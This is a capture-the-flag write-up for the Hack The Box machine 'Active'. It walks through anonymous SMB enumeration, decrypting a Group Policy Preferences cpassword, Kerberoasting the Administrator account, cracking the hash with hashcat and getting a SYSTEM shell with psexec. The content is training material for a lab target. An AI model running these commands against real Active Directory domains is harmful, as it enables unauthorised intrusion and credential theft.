# Active — Hack The Box

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Windows |
| **Difficulty** | Easy |
| **IP** | `10.129.82.171` |
| **Domain** | `active.htb` |

## Synopsis

Active is an easy Windows **Active Directory** machine. An anonymously readable SMB share
(`Replication`) exposes a cached Group Policy Preferences file, `Groups.xml`, containing an
AES-encrypted **`cpassword`**. Microsoft published the AES key, so the password for the
`SVC_TGS` account is trivially decrypted (the classic **GPP / MS14-025** issue). As `SVC_TGS`,
the **Administrator** account — which has a registered SPN — is **Kerberoasted**, and its TGS
is cracked offline, yielding Domain Admin and a SYSTEM shell.

---

## Enumeration

### Nmap

```bash
nmap -p- --min-rate=5000 -T4 10.129.82.171
nmap -p53,88,135,139,389,445,464,636,3268 -sCV 10.129.82.171
```

A Domain Controller footprint. Add `active.htb` to `/etc/hosts`.

### SMB — anonymous Replication share

```bash
smbclient -L //10.129.82.171/ -N
smbclient //10.129.82.171/Replication -N
```

`Replication` is readable without credentials. It mirrors SYSVOL and contains the GPP path:

```
\active.htb\Policies\{...}\MACHINE\Preferences\Groups\Groups.xml
```

Pull it recursively:

```bash
smbclient //10.129.82.171/Replication -N -c "prompt OFF; recurse ON; mget *"
```

---

## Foothold — GPP cpassword (MS14-025)

`Groups.xml` contains an encrypted `cpassword` for `SVC_TGS`:

```xml
<Properties ... userName="active.htb\SVC_TGS"
  cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"/>
```

The AES key used by GPP is public, so the value decrypts instantly:

```bash
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
# GPPstillStandingStrong2k18
```

Validate and grab the user flag:

```bash
smbclient //10.129.82.171/Users -U 'active.htb\SVC_TGS%GPPstillStandingStrong2k18'
```

The **user flag** is in `\Users\SVC_TGS\Desktop\user.txt`.

---

## Privilege Escalation — Kerberoasting the Administrator

The `Administrator` account has an SPN registered, so any authenticated user can request its
service ticket and crack it offline:

```bash
GetUserSPNs.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.129.82.171 -request
# $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS...*$...
```

Crack the TGS:

```bash
hashcat -m 13100 admin.tgs /usr/share/wordlists/rockyou.txt
# Administrator : Ticketmaster1968
```

Use the cracked Domain Admin password for a SYSTEM shell:

```bash
psexec.py active.htb/Administrator:'Ticketmaster1968'@10.129.82.171
```

```
C:\> whoami
nt authority\system
```

The **root flag** is in `C:\Users\Administrator\Desktop\root.txt`.
